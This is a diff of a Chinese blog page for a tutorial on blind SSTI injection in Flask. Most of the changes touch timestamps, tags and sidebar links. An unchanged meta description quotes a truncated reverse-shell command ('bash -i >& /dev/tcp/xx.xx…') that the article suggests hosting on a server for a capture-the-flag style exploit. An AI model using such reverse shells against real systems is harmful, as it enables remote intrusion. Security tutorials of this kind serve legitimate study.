@@ -28,16 +28,14 @@
 <meta property="og:description" content="[TOC] 摘要这篇文章主要是讲解针对ssti注入无回显的情况，我们如何获取flag（本篇文章的测试环境是python3.9.13，flask3.0.3）。 能出网反弹shell我这边建议是将反弹命令写在本地服务器上面，然后再进行请求执行，这样不容易出现错误。 在本地服务器上面新键一个文件（假如是rebound.txt）： 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xx.xx.xx.">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-12-30T13:50:16.000Z">
-<meta property="article:modified_time" content="2024-12-30T17:24:50.884Z">
+<meta property="article:modified_time" content="2024-12-30T18:28:05.957Z">
 <meta property="article:author" content="AAAAl">
-<meta property="article:tag" content="python">
-<meta property="article:tag" content="ssti">
 <meta property="article:tag" content="无回显注入">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <meta name="keywords" content="python,ssti,无回显注入">
+  <meta name="keywords" content="无回显注入">
 
   <!-- feed -->
   
@@ -72,7 +70,7 @@
 <div class="widgets">
 
 
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/"><span class="title">flask中的ssti注入-绕过</span></a><a class="item title" href="/2024/12/30/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E6%97%A0%E5%9B%9E%E6%98%BE/"><span class="title">flask中的ssti注入-无回显</span></a><a class="item title" href="/2024/12/23/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span class="title">flask中的ssti注入-前置基础知识</span></a></div></widget>
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/12/30/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E6%97%A0%E5%9B%9E%E6%98%BE/"><span class="title">flask中的ssti注入-无回显</span></a><a class="item title" href="/2024/12/23/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><span class="title">flask中的ssti注入-前置基础知识</span></a><a class="item title" href="/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/"><span class="title">flask中的ssti注入-绕过</span></a></div></widget>
 </div>
 <footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/AAAA-l" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"></a></div></footer>
 </div></aside><div class="l_main" id="main">
@@ -85,7 +83,7 @@
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 <span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/python/">python</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/python/ssti/">ssti</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-12-30T13:50:16.000Z">2024-12-30</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-12-30T17:24:50.884Z">2024-12-31</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-12-30T13:50:16.000Z">2024-12-30</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-12-30T18:28:05.957Z">2024-12-31</time></span></div></div></div>
     
   </div>
   </div><article class="md-text content"><p>[TOC]</p>
@@ -135,8 +133,7 @@
     </section>
     <section class='body'>
     <div class="related-posts"><a class="item" href="\2024\12\23\flask中的ssti注入-前置基础知识\" title="flask中的ssti注入-前置基础知识"><span class="title">flask中的ssti注入-前置基础知识</span><span class="excerpt">[TOC]
-摘要为什么要写这一篇文章呢？一方面是是为了防止手注时出现错误不知如何进行更改，另一方面是后面讲得所有的利用和绕过都是在此基础上，只有对这方面有所了解，你才能理解后面的payload。（会讲得比较细致，适合零基础的小白）。不...</span></a><a class="item" href="\2024\12\26\flask中的ssti注入-绕过\" title="flask中的ssti注入-绕过"><span class="title">flask中的ssti注入-绕过</span><span class="excerpt">[TOC]
-摘要这篇文章本身主要是讲解针对ssti的过滤如何进行绕过（本篇文章的测试环境是python3.9.13，flask3.0.3）。</span></a></div></section></div>
+摘要为什么要写这一篇文章呢？一方面是是为了防止手注时出现错误不知如何进行更改，另一方面是后面讲得所有的利用和绕过都是在此基础上，只有对这方面有所了解，你才能理解后面的payload。（会讲得比较细致，适合零基础的小白）。不...</span></a></div></section></div>
 
 
 
